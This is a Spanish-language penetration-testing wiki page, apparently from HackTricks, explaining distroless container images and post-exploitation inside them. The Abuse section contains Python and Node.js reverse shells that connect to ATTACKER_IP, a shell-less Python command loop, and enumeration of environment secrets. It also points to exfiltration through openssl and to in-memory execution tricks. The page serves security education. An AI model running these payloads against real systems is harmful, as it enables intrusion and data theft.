# Contenedores Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Una imagen de contenedor **distroless** es una imagen que incluye los **componentes mínimos del runtime necesarios para ejecutar una aplicación específica**, eliminando intencionadamente las herramientas habituales de la distribución, como gestores de paquetes, shells y grandes conjuntos de utilidades genéricas de userland. En la práctica, las imágenes distroless suelen contener únicamente el binario o runtime de la aplicación, sus librerías compartidas, bundles de certificados y una estructura de filesystem muy pequeña.

El objetivo no es que distroless sea una nueva primitiva de aislamiento del kernel. Distroless es una **estrategia de diseño de imágenes**. Cambia lo que está disponible **dentro** del filesystem del contenedor, no la forma en que el kernel aísla el contenedor. Esta distinción es importante, porque distroless hardens el entorno principalmente reduciendo lo que un atacante puede usar después de obtener code execution. No reemplaza namespaces, seccomp, capabilities, AppArmor, SELinux ni ningún otro mecanismo de aislamiento del runtime.

## Por qué existe Distroless

Las imágenes distroless se utilizan principalmente para reducir:

- el tamaño de la imagen
- la complejidad operativa de la imagen
- el número de paquetes y binarios que podrían contener vulnerabilidades
- el número de herramientas de post-exploitation disponibles para un atacante de forma predeterminada

Por eso las imágenes distroless son populares en los despliegues de aplicaciones en producción. Un contenedor que no contiene shell, gestor de paquetes ni prácticamente ninguna herramienta genérica suele ser más fácil de analizar operativamente y más difícil de abusar de forma interactiva tras un compromiso.

Algunas familias conocidas de imágenes de estilo distroless incluyen:

- Imágenes distroless de Google
- Imágenes hardened/minimal de Chainguard

## Lo que Distroless no significa

Un contenedor distroless **no es**:

- automáticamente rootless
- automáticamente non-privileged
- automáticamente read-only
- automáticamente protegido por seccomp, AppArmor o SELinux
- automáticamente seguro frente a container escape

Aun es posible ejecutar una imagen distroless con `--privileged`, compartición de host namespaces, bind mounts peligrosos o un runtime socket montado. En ese escenario, la imagen puede ser minimal, pero el contenedor aún puede ser catastróficamente inseguro. Distroless cambia la **superficie de ataque del userland**, no la **frontera de confianza del kernel**.

## Características operativas habituales

Cuando comprometes un contenedor distroless, lo primero que normalmente notas es que las suposiciones habituales dejan de ser ciertas. Puede que no exista `sh`, `bash`, `ls`, `id`, `cat`, y a veces ni siquiera un entorno basado en libc que se comporte como espera tu tradecraft habitual. Esto afecta tanto a offense como a defense, porque la falta de herramientas hace que el debugging, la respuesta ante incidentes y el post-exploitation sean diferentes.

Los patrones más habituales son:

- existe el runtime de la aplicación, pero poco más
- los payloads basados en shell fallan porque no hay shell
- los one-liners habituales de enumeración fallan porque faltan los binarios auxiliares
- las protecciones del filesystem, como read-only rootfs o `noexec` en ubicaciones writable de tmpfs, también suelen estar presentes

Esta combinación es la que normalmente lleva a hablar de "weaponizing distroless".

## Distroless y Post-Exploitation

El principal desafío ofensivo en un entorno distroless no siempre es el RCE inicial. A menudo es lo que ocurre después. Si el workload explotado proporciona code execution en un lenguaje runtime como Python, Node.js, Java o Go, es posible que puedas ejecutar lógica arbitraria, pero no mediante los workflows habituales centrados en shells que son comunes en otros targets Linux.

Esto significa que el post-exploitation suele orientarse en una de estas tres direcciones:

1. **Usar directamente el lenguaje runtime existente** para enumerar el entorno, abrir sockets, leer archivos o preparar payloads adicionales.
2. **Introducir tus propias herramientas en memoria** si el filesystem es read-only o las ubicaciones writable están montadas con `noexec`.
3. **Abusar de los binarios existentes en la imagen** si la aplicación o sus dependencias incluyen algo inesperadamente útil.

## Abuse

### Enumerar el Runtime que ya tienes

En muchos contenedores distroless no hay shell, pero aún existe un application runtime. Si el target es un servicio Python, Python está presente. Si el target es Node.js, Node está presente. Esto suele proporcionar suficiente funcionalidad para enumerar archivos, leer variables de entorno, abrir reverse shells y preparar ejecución en memoria sin invocar nunca `/bin/sh`.

Un ejemplo sencillo con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un ejemplo sencillo con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperación de variables de entorno, que a menudo incluyen credenciales o endpoints de servicios
- enumeración del sistema de archivos sin `/bin/ls`
- identificación de rutas con permisos de escritura y secrets montados

### Reverse Shell Without `/bin/sh`

Si la image no contiene `sh` o `bash`, una Reverse Shell clásica basada en shell puede fallar inmediatamente. En esa situación, utiliza el language runtime instalado.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Si `/bin/sh` no existe, reemplaza la línea final con una ejecución directa de comandos mediante Python o un bucle REPL de Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Nuevamente, si `/bin/sh` no está presente, usa directamente las APIs de filesystem, process y networking de Node en lugar de iniciar un shell.

### Full Example: No-Shell Python Command Loop

Si la image contiene Python pero no tiene ningún shell, un bucle interactivo simple suele ser suficiente para mantener toda la capacidad de post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Esto no requiere un binario de shell interactivo. El impacto es prácticamente el mismo que el de un shell básico desde la perspectiva del atacante: ejecución de comandos, enumeración y preparación de payloads adicionales mediante el runtime existente.

### Ejecución de herramientas en memoria

Las imágenes Distroless suelen combinarse con:

- `readOnlyRootFilesystem: true`
- un tmpfs escribible pero `noexec`, como `/dev/shm`
- ausencia de herramientas de gestión de paquetes

Esta combinación hace que los flujos de trabajo clásicos de «descargar un binario al disco y ejecutarlo» sean poco fiables. En esos casos, las técnicas de ejecución en memoria se convierten en la principal alternativa.

La página específica para esto es:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Las técnicas más relevantes allí son:

- `memfd_create` + `execve` mediante scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binarios existentes en la imagen

Algunas imágenes Distroless todavía contienen binarios necesarios para las operaciones que resultan útiles después de un compromiso. Un ejemplo observado repetidamente es `openssl`, ya que las aplicaciones a veces lo necesitan para tareas relacionadas con criptografía o TLS.

Un patrón de búsqueda rápido es:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Si `openssl` está presente, puede ser utilizable para:

- conexiones TLS salientes
- exfiltration de datos a través de un canal de egress permitido
- staging de datos de payload mediante blobs codificados/cifrados

El abuso exacto depende de lo que esté realmente instalado, pero la idea general es que distroless no significa "sin ninguna herramienta"; significa "muchas menos herramientas que una imagen de distribución normal".

## Comprobaciones

El objetivo de estas comprobaciones es determinar si la imagen es realmente distroless en la práctica y qué binarios de runtime o auxiliares siguen disponibles para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Qué resulta interesante aquí:

- Si no existe ningún shell, pero hay un runtime como Python o Node, el post-exploitation debería pivotar hacia la ejecución guiada por el runtime.
- Si el sistema de archivos raíz es de solo lectura y `/dev/shm` permite escritura, pero tiene `noexec`, las técnicas de ejecución en memoria adquieren mucha más relevancia.
- Si existen helper binaries como `openssl`, `busybox` o `java`, pueden ofrecer funcionalidad suficiente para bootstrap further access.

## Valores predeterminados del runtime

| Estilo de imagen / plataforma | Estado predeterminado | Comportamiento habitual | Debilitamiento manual común |
| --- | --- | --- | --- |
| Imágenes de estilo Google distroless | Userland mínimo por diseño | Sin shell, sin package manager, solo dependencias de la aplicación/runtime | añadir capas de debugging, shells sidecar, copiar busybox o tooling |
| Imágenes minimalistas de Chainguard | Userland mínimo por diseño | Superficie de paquetes reducida, normalmente centrada en un runtime o servicio | usar `:latest-dev` o variantes de debugging, copiar herramientas durante el build |
| Workloads de Kubernetes que utilizan imágenes distroless | Depende de la configuración del Pod | Distroless solo afecta al userland; la postura de seguridad del Pod sigue dependiendo de la especificación del Pod y de los valores predeterminados del runtime | añadir contenedores de debugging efímeros, host mounts, configuraciones de Pod privilegiadas |
| Docker / Podman ejecutando imágenes distroless | Depende de los flags de ejecución | Sistema de archivos mínimo, pero la seguridad del runtime sigue dependiendo de los flags y de la configuración del daemon | `--privileged`, compartir namespaces del host, mounts del socket del runtime, binds del host con permisos de escritura |

El punto clave es que distroless es una **propiedad de la imagen**, no una protección del runtime. Su valor proviene de reducir lo que está disponible dentro del sistema de archivos después de un compromiso.

## Páginas relacionadas

Para los bypasses del sistema de archivos y de la ejecución en memoria que suelen ser necesarios en entornos distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Para el abuso del runtime de contenedores, sockets y mounts, que también se aplica a workloads distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
